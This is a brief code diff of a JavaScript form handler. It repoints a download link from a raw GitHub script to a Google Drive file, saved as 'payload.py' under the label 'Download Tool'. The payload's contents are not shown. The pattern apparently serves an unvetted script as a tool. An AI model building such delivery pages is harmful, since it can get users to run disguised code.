@@ -11,7 +11,7 @@ document.getElementById('toolForm').addEventListener('submit', async function(ev
     statusMessage.style.color = '#40c057';
     
     // Set the download link properties
-    downloadLink.href = 'https://raw.githubusercontent.com/Syxfer/ayyyy-wagggg/refs/heads/main/pull.py';
+    downloadLink.href = 'https://drive.google.com/uc?export=download&id=12d4bJhNQN9MIwbFxlnEmcbxxPp8uzTYk';
     downloadLink.download = 'payload.py';
     downloadLink.textContent = 'Download Tool';
     downloadLink.style.display = 'block';
